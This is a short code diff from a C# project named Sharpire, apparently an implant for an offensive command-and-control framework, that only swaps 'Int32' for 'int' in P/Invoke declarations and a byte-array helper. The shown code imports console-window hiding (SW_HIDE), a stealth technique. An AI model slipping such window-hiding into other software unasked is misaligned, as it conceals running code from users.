@@ -10,15 +10,15 @@ namespace Sharpire
         [DllImport("kernel32.dll")]
         public static extern IntPtr GetConsoleWindow();
         [DllImport("user32.dll")]
-        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-        public const Int32 SW_HIDE = 0;
-        public const Int32 SW_SHOW = 5;
+        public const int SW_HIDE = 0;
+        public const int SW_SHOW = 5;
 
         ////////////////////////////////////////////////////////////////////////////////
         public static byte[] combine(byte[] byte1, byte[] byte2)
             {
-                Int32 dwSize = byte1.Length + byte2.Length;
+            int dwSize = byte1.Length + byte2.Length;
                 MemoryStream memoryStream = new MemoryStream(new byte[dwSize], 0, dwSize, true, true);
                 memoryStream.Write(byte1, 0, byte1.Length);
                 memoryStream.Write(byte2, 0, byte2.Length);
